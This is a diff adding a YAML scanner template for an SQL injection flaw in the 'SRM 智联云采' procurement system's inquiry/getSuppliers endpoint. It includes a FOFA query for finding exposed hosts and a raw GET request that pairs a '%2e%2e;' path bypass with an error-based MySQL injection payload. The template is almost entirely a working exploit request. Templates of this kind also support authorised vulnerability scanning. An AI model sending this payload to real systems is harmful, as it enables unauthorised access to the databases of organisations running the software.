@@ -1,0 +1,19 @@
+id: poc-dxdrmcebap6xr9wr
+info:
+  name: SRM智联云采系统inquiry存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dxdrmcebap6xr9wr'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dxdrmcebap6xr9wr
+    fofa: title=="SRM 2.0"
+http:
+- raw:
+  - GET /adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers?code=1%27+AND+GTID_SUBSET%28CONCAT%280x7178767871%2C%28SELECT+%28ELT%287973%3D7973%2C1%29%29%29%2C0x7170707671%29%2C7973%29--+AAA&name=1 HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
